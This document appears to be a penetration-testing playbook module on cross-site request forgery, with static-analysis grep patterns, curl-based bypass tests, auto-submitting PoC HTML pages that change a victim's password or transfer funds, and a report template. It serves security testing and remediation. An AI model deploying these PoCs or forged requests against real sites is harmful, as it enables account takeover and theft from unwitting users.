# VULN MODULE — Cross-Site Request Forgery (CSRF)
# Asset: webapp
# CWE-352 | Report prefix: WEB-CSRF

## THREAT MODEL

CSRF forces an authenticated user's browser to make unintended state-changing
requests to a target application. The browser automatically attaches session
cookies, so the server cannot distinguish a legitimate user request from a
forged one if no additional proof-of-origin check exists.

Attack surface:
- Any POST/PUT/PATCH/DELETE endpoint that changes account state
- Password/email change, fund transfer, privilege escalation, account deletion
- API endpoints that accept cookies (not just Bearer tokens)
- Multipart form submissions that bypass content-type preflight
- State-changing GET endpoints (anti-pattern but common in legacy apps)

CSRF is meaningful only when:
  1. The endpoint mutates server-side state
  2. Authentication relies on cookies (or HTTP Basic/Digest)
  3. No unpredictable, session-tied token is validated server-side

## VULNERABILITY CLASSES

1. Missing CSRF Token                       CWE-352  — no anti-forgery token on form/endpoint
2. Token Present But Not Validated          CWE-352  — token generated, server ignores it
3. Token Not Tied to Session               CWE-352  — static/global token accepted for any session
4. Double-Submit Cookie Bypass             CWE-352  — cookie value == header value, no server-side state
5. SameSite=None Without Secure            CWE-614  — cookie sent cross-site over HTTP
6. SameSite Not Set (legacy browser risk)  CWE-352  — defaults to None in older browsers
7. CORS Preflight Bypass Enabling CSRF     CWE-942  — CORS wildcard + credentialed request allowed
8. Referer / Origin Header Bypass          CWE-352  — validation only on Referer, bypassable via null/blank

## WHITEBOX STATIC ANALYSIS

```bash
# ── Django ───────────────────────────────────────────────────────────────────
# Check middleware stack — CsrfViewMiddleware must be present and not skipped
grep -rn "CsrfViewMiddleware\|csrf_exempt\|@csrf_exempt" \
  --include="*.py"
# @csrf_exempt on views = unprotected endpoint

# Check forms for {% csrf_token %}
grep -rn "csrf_token\|csrfmiddlewaretoken" --include="*.html" --include="*.py"
# HTML forms missing {% csrf_token %} → unprotected

# ── Flask-WTF / WTForms ──────────────────────────────────────────────────────
grep -rn "FlaskForm\|CSRFProtect\|WTF_CSRF\|csrf\.init_app" --include="*.py"
grep -rn "validate_on_submit\|hidden_tag\|form\.csrf_token" --include="*.py" \
  --include="*.html"
# Missing CSRFProtect().init_app(app) = global protection absent

# ── Spring Security (Java) ────────────────────────────────────────────────────
grep -rn "csrf()\|CsrfConfigurer\|csrfTokenRepository\|ignoringAntMatchers\|disable()" \
  --include="*.java" -A5
# .csrf().disable() = CSRF protection explicitly removed
grep -rn "CookieCsrfTokenRepository\|HttpSessionCsrfTokenRepository" --include="*.java"

# ── Laravel (PHP) ─────────────────────────────────────────────────────────────
grep -rn "VerifyCsrfToken\|except\s*=" --include="*.php"
# $except array in VerifyCsrfToken = routes excluded from protection
grep -rn "@csrf\|csrf_field\|csrf_token()" --include="*.php" --include="*.blade.php"
# Blade forms missing @csrf directive → unprotected

# ── Express / Node.js ────────────────────────────────────────────────────────
grep -rn "csurf\|csrf\|lusca\|helmet" --include="*.js" --include="*.ts"
# Missing csurf middleware = no CSRF protection

# ── Generic: SameSite cookie configuration ───────────────────────────────────
grep -rn "SameSite\|samesite\|same_site" \
  --include="*.py" --include="*.js" --include="*.ts" \
  --include="*.java" --include="*.php" --include="*.conf"
# SameSite=None without Secure, or absent → browser sends cookie cross-site

# ── Double-submit cookie pattern (check for server-side comparison) ───────────
grep -rn "req\.cookies.*csrf\|request\.cookies.*csrf\|getCookie.*csrf" \
  --include="*.js" --include="*.ts" --include="*.py" -A5
# If only compared to request header with no server-side state → bypassable
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Identify state-changing endpoints

```bash
# Capture all non-GET requests via Burp proxy, then enumerate:
# Target methods: POST, PUT, PATCH, DELETE
# Target actions: /account/email, /account/password, /transfer, /admin/*, /settings/*

# Check if endpoint accepts GET for state changes (worst case):
curl -s -X GET "https://target.com/api/account/email?email=attacker@evil.com" \
  -H "Cookie: session=VALID_SESSION"
```

### Step 2 — Test CSRF token absence / non-validation

Run through all five bypass attempts in order:

1. **Omit** the CSRF token parameter entirely
2. **Blank** value — send `csrf_token=`
3. **Random** value — send `csrf_token=AAAAAAAAAA`
4. **Same length** as the real token — some validators only check length
5. **Cross-session reuse** — use token from a different authenticated user's session

```bash
# 1. Omit:
curl -s -X POST "https://target.com/account/email" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker%40evil.com"

# 2. Blank:
curl -s -X POST "https://target.com/account/email" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker%40evil.com&csrf_token="

# 3. Random:
curl -s -X POST "https://target.com/account/email" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker%40evil.com&csrf_token=INVALID_TOKEN_12345"

# 4. Same length as real token — observe token length first, then match it:
# (replace XXXX... with same number of chars as observed token)

# 5. Cross-session: copy USER_A's token, use in USER_B's session request
curl -s -X POST "https://target.com/account/email" \
  -H "Cookie: session=USER_B_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker%40evil.com&csrf_token=USER_A_CSRF_TOKEN"

# Any success → token not properly validated
```

### Step 3 — Test token not tied to session

```bash
# Log in as User A, copy their CSRF token
# Log in as User B, use User A's CSRF token in User B's request
curl -s -X POST "https://target.com/account/password" \
  -H "Cookie: session=USER_B_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "new_password=hacked&csrf_token=USER_A_CSRF_TOKEN"
# Success = token not session-bound
```

### Step 4 — Test SameSite cookie configuration

```bash
# Check Set-Cookie header on login response:
curl -sI "https://target.com/login" | grep -i "set-cookie"
# Flags to check:
#   SameSite=None; Secure  → cross-site allowed (should require Secure)
#   SameSite=None (no Secure) → CWE-614, sent over HTTP cross-site
#   No SameSite flag        → defaults to Lax in modern browsers but None in older

# Test cross-origin request with SameSite=None cookie:
# (Requires browser PoC — see Dynamic Confirmation)
```

### Step 5 — Test double-submit cookie bypass

```bash
# If protection is: set csrf_cookie=XYZ; also send X-CSRF-Token: XYZ header
# Bypass: if server only compares cookie to header (no server-side store),
# attacker can set both to the same value via XSS or subdomain cookie injection

# Test: send mismatched cookie vs header:
curl -s -X POST "https://target.com/api/transfer" \
  -H "Cookie: session=VALID_SESSION; csrf=ATTACKER_CHOSEN" \
  -H "X-CSRF-Token: ATTACKER_CHOSEN" \
  -H "Content-Type: application/json" \
  -d '{"to":"attacker","amount":1000}'
# If success = double-submit with no server-side binding → bypassable
```

### Step 6 — Test Origin / Referer bypass

```bash
# Null Referer:
curl -s -X POST "https://target.com/account/delete" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Referer: " \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "confirm=yes"

# No Referer header (suppress via meta tag in PoC HTML):
# <meta name="referrer" content="no-referrer">
curl -s -X POST "https://target.com/account/delete" \
  --referer "" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "confirm=yes"

# If server accepts requests with missing/null Referer = Referer-only check bypassable

# Referer whitelist bypass — validator checks if legitimate domain appears in Referer:
# Subdomain prefix:  legitimate.example.com.attacker.com  (passes suffix check)
# Path suffix:       attacker.com/legitimate.example.com  (passes substring check)
curl -s -X POST "https://target.com/account/delete" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Referer: https://target.com.attacker.com/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "confirm=yes"
```

**PoC HTML — suppress Referer with meta tag:**
```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://app.example.com/api/profile/update" method="POST">
      <input type="hidden" name="new_email" value="attacker@example.com"/>
    </form>
    <script>history.pushState('','','/');document.forms[0].submit();</script>
  </body>
</html>
```

### Step 7 — Content-Type confusion (JSON endpoint bypass)

```bash
# Some frameworks only check CSRF token for form-encoded bodies.
# Test: send JSON body with form Content-Type (triggers preflight bypass):
curl -s -X POST "https://target.com/api/transfer" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: text/plain" \
  -d '{"to":"attacker","amount":1000}'
# text/plain does not trigger CORS preflight → no CSRF protection applied

# Test: send form-encoded body to JSON-only endpoint — framework may still parse it:
curl -s -X POST "https://target.com/api/transfer" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "to=attacker&amount=1000"
```

**PoC: `text/plain` enctype with JSON reconstructed from name=value**

When the server expects JSON but `text/plain` is accepted, encode the JSON body
across the `name` and `value` fields of a hidden input — the browser sends `name=value`
which reconstructs valid JSON server-side:

```html
<form action="https://app.example.com/api/profile/update" method="POST" enctype="text/plain">
  <input type="hidden" name='{"test":"x' value='y","new_email":"attacker@example.com"}'/>
</form>
```
Browser sends body: `{"test":"x=y","new_email":"attacker@example.com"}` — valid JSON.

### Step 8 — HTTP method manipulation

Endpoints using PUT/PATCH trigger CORS preflight (browser blocks cross-origin).
Test whether the same operation is accepted via POST — HTML forms only support GET/POST,
so a POST-accepting endpoint is directly exploitable from a basic CSRF form:

```bash
curl -s -X POST "https://target.com/api/profile/update" \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "new_email=attacker@evil.com"
# If endpoint normally expects PUT/PATCH but accepts POST → CSRF is exploitable via form
```

## DYNAMIC CONFIRMATION

### PoC HTML Page — State-Changing Cross-Origin Request

Save as `csrf_poc.html` and serve from attacker.com (or file://).
Victim visits the page while authenticated to target.com.

```html
<!-- PoC: CSRF — Password Change -->
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/password" method="POST"
        enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="new_password" value="Pwned@123456">
    <input type="hidden" name="confirm_password" value="Pwned@123456">
    <!-- Intentionally omit csrf_token field -->
  </form>
  <p>Loading...</p>
</body>
</html>
```

Confirmation criteria:
1. Victim loads the page (authenticated session cookie present in browser)
2. Form auto-submits cross-origin
3. Response is 200/302 (not 403 Forbidden / CSRF token mismatch)
4. Verify on victim account: password was changed / action executed
5. No interaction beyond page load required

### PoC: JSON endpoint CSRF via fetch (SameSite=None or legacy)

```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',               // send victim's session cookie
  headers: {'Content-Type': 'text/plain'}, // avoid CORS preflight
  body: JSON.stringify({to: 'attacker', amount: 500})
})
.then(r => r.json())
.then(d => console.log('Result:', d));
</script>
</body>
</html>
```

## TOOLS

```bash
# Bolt — Python3 CSRF exploitation tool (web crawling + auto-exploitation)
git clone https://github.com/s0md3v/Bolt
python3 bolt.py -u https://target.com

# XSRFProbe — advanced CSRF toolkit (crawling + extensive detection)
pip install xsrfprobe
xsrfprobe -u https://target.com

# Burp Suite — CSRF PoC Creator extension: generates PoC HTML from captured requests
# Install from BApp Store: "CSRF PoC Creator"
# Or use built-in: right-click request → Engagement tools → Generate CSRF PoC
```

## REPORT_BUNDLE FIELDS

```json
{
  "id": "WEB-CSRF-001",
  "title": "CSRF on [endpoint] allows [action] without user interaction",
  "cwe": 352,
  "severity": "High",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
  "cvss_score": 6.5,
  "endpoint": "POST https://target.com/account/password",
  "method": "POST",
  "parameters": {
    "new_password": "attacker-controlled",
    "csrf_token": "absent or not validated"
  },
  "evidence": {
    "request": "POST /account/password HTTP/1.1\\nCookie: session=VICTIM_SESSION\\n\\nnew_password=Pwned%40123456",
    "response_status": 302,
    "response_snippet": "Location: /account?success=1",
    "poc_url": "https://attacker.com/csrf_poc.html"
  },
  "impact": "Attacker can perform [action] on behalf of any authenticated user who visits attacker page. No user interaction beyond page visit required.",
  "remediation": "Implement synchronizer token pattern with session-bound CSRF tokens. Set SameSite=Lax or Strict on session cookie. Validate Origin/Referer server-side as defense-in-depth."
}
```

## TRIAGE NOTE

CSRF with no sensitive action (read-only endpoint): Informative / N/A
CSRF → password/email change: High
CSRF → fund transfer / privilege escalation: Critical
CSRF → account deletion: High
SameSite=Lax by default (modern browser): Significantly reduces exploitability — document
browser version constraints and test with SameSite-unaware browser if possible.
API endpoints that require JSON Content-Type: check whether fetch() with
`credentials: include` is possible — preflight may block if CORS not misconfigured.
